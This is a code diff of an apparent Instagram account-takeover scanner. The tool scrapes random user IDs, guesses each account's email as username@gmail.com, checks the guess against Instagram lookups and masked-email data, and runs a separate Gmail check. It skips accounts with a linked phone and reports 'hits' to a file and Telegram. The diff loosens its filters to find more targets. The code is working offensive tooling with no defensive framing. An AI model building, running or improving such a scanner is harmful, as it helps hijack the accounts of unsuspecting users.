@@ -1604,22 +1604,29 @@ def _m2_format_hit(hit_num, username, email, user_data, gmail_masked):
 
 # ── Save hit ───────────────────────────────────────────────────────────────────
 
-def _m2_save_hit(username, user_data, token, chat_id):
+def _m2_save_hit(username, user_data, token, chat_id, min_posts=20):
     """Format M2 hit, write to file, notify Telegram."""
     global _m2_hits, _m2_total
     try:
         posts = int(user_data.get('media_count') or 0)
-        if posts < 20:
+        # Minimum post filter — user-configured threshold
+        if posts < min_posts:
             return
         email = f"{username}@gmail.com"
 
-        # CHECK: GraphQL masked email — if present it must match username@gmail.com.
-        # _m2_lookup already confirmed the email is linked to an IG account via
-        # bloks search, so silence here is fine; only reject on a clear mismatch.
-        gmail_masked = _m2_get_masked(username)
+        # Fetch masked email from GraphQL — also tells us if a phone is linked.
+        # _m1_get_masked returns (masked_email, has_phone).
+        gmail_masked, has_phone = _m1_get_masked(username)
+
+        # Phone-bound filter — skip accounts with a phone number linked
+        if has_phone:
+            return
+
+        # Masked email validation — if Instagram returns a real masked email
+        # it must match username@gmail.com; silence means unknown, not wrong.
         if gmail_masked:
             if not _m1_masked_matches_username(username, gmail_masked):
-                return   # masked email from GraphQL does not match → skip
+                return
 
         display_reset = gmail_masked if gmail_masked else email
 
@@ -1652,10 +1659,10 @@ def _m2_save_hit(username, user_data, token, chat_id):
 # ── Scanner worker ─────────────────────────────────────────────────────────────
 
 def _m2_get_usernames(token, chat_id, min_posts, stop_event):
-    """Single worker: scrape random IG user IDs, filter by posts, run lookup → Gmail check → hit."""
+    """Single worker: scrape random IG user IDs, run lookup → Gmail check → hit."""
     global _m2_scanned
     loc_session = _register_session(requests.Session())
-    _min_posts = max(20, int(min_posts) if min_posts else 20)
+    _min_posts = max(1, int(min_posts) if min_posts else 1)
     while not (stop_event and stop_event.is_set()):
         try:
             csrf, lsd = _m2_load_tokens()
@@ -1691,14 +1698,15 @@ def _m2_get_usernames(token, chat_id, min_posts, stop_event):
                 ud = resp.json().get('data', {}).get('user') or {}
             except Exception:
                 continue
-            username = ud.get('username')
-            posts    = int(ud.get('media_count') or 0)
-            uid      = ud.get('pk')
-            if username and uid and posts >= _min_posts:
+            username  = ud.get('username')
+            followers = int(ud.get('follower_count') or 0)
+            uid       = ud.get('pk')
+            # Match original scanner criteria: just need a valid account with followers
+            if username and uid and followers > 20:
                 email = username + '@gmail.com'
                 if _m2_lookup(email, loc_session):
                     if _m2_check_gmail(username, loc_session):
-                        _m2_save_hit(username, ud, token, chat_id)
+                        _m2_save_hit(username, ud, token, chat_id, _min_posts)
         except Exception:
             pass
 
